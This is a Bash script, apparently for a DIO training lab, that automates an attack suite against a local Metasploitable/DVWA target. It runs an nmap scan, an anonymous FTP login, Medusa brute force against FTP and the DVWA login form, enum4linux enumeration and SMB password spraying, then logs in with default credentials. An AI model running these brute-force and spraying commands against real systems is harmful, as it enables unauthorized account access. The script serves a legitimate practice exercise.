#!/bin/bash
# Suite completa do Desafio DIO - executada dentro do Kali via guestcontrol
set +e
D=/home/kali/desafio
E=$D/evidencias
W=$D/wordlists
mkdir -p "$E" "$W"

echo "########################################################"
echo "# SUITE COMPLETA - DESAFIO DIO MEDUSA"
echo "# Data: $(date)"
echo "########################################################"

# -------------------------------------------------- CT-02 / CT-03
{
  echo "=== CT-02: identidade e IP do Kali ==="
  whoami
  ip -4 a | grep inet
  echo
  echo "=== CT-03: conectividade com o alvo 192.168.56.101 ==="
  ping -c 2 192.168.56.101
  echo
  echo "=== MAC do alvo (ARP) ==="
  ping -c 1 192.168.56.101 >/dev/null 2>&1
  grep 192.168.56.101 /proc/net/arp
} 2>&1 | tee "$E/01-ip-kali.txt"

# -------------------------------------------------- CT-04
{
  echo "=== CT-04: nmap -n -sV -Pn 192.168.56.101 ==="
  nmap -n -sV -Pn 192.168.56.101
} 2>&1 | tee "$E/09-nmap-kali.txt"

# -------------------------------------------------- CT-05
{
  echo "=== CT-05: FTP anonimo ==="
  printf 'user anonymous anonymous@test.com\nls\nbye\n' | ftp -inv 192.168.56.101
} 2>&1 | tee "$E/04-ftp-anonimo.txt"

# -------------------------------------------------- CT-06
{
  echo "=== CT-06: Medusa FTP ==="
  echo "CMD: medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 4"
  echo
  medusa -h 192.168.56.101 -U "$W/users.txt" -P "$W/passwords.txt" -M ftp -t 4
} 2>&1 | tee "$E/04-medusa-ftp.txt"

# -------------------------------------------------- validacao FTP msfadmin
{
  echo "=== Validacao FTP com msfadmin:msfadmin ==="
  printf 'user msfadmin msfadmin\npwd\nls\nbye\n' | ftp -inv 192.168.56.101
} 2>&1 | tee "$E/04-ftp-msfadmin.txt"

# -------------------------------------------------- CT-07
{
  echo "=== CT-07: DVWA login manual via curl ==="
  echo "GET /dvwa/ ->"
  curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://192.168.56.101/dvwa/
  echo
  echo "POST login admin/password ->"
  curl -s -i -c /tmp/dvwa_cookies -b /tmp/dvwa_cookies \
    -d 'username=admin&password=password&Login=Login' \
    http://192.168.56.101/dvwa/login.php | head -n 25
} 2>&1 | tee "$E/05-dvwa-curl.txt"

# -------------------------------------------------- CT-08
{
  echo "=== CT-08: Medusa web-form (DVWA) ==="
  echo "CMD: medusa -M web-form -m FORM:/dvwa/login.php -m DENY-SIGNAL:Login Failed"
  echo
  medusa -h 192.168.56.101 -U "$W/users.txt" -P "$W/passwords.txt" \
    -M web-form \
    -m FORM:"/dvwa/login.php" \
    -m DENY-SIGNAL:"Login Failed" \
    -m FORM-DATA:"post?username=&USERNAME&password=&PASSWORD&Login=Login" \
    -t 4
} 2>&1 | tee "$E/06-medusa-webform.txt"

# -------------------------------------------------- CT-09
{
  echo "=== CT-09: enum4linux -U 192.168.56.101 ==="
  enum4linux -U 192.168.56.101
} 2>&1 | tee "$E/08-enum4linux.txt"

# -------------------------------------------------- CT-10
{
  echo "=== CT-10: password spraying SMB ==="
  echo "CMD: medusa -M smb -U users-enum.txt -P spray.txt -t 3"
  echo
  medusa -h 192.168.56.101 -U "$W/users-enum.txt" -P "$W/spray.txt" -M smb -t 3
} 2>&1 | tee "$E/07-medusa-smb-spray.txt"

# -------------------------------------------------- CT-11
{
  echo "=== CT-11: validacao de acesso SMB ==="
  smbclient //192.168.56.101/msfadmin -U msfadmin%msfadmin -c 'ls'
} 2>&1 | tee "$E/07-smb-acesso.txt"

echo
echo "########################################################"
echo "# FIM DA SUITE - arquivos em $E"
echo "########################################################"
ls -lh "$E"
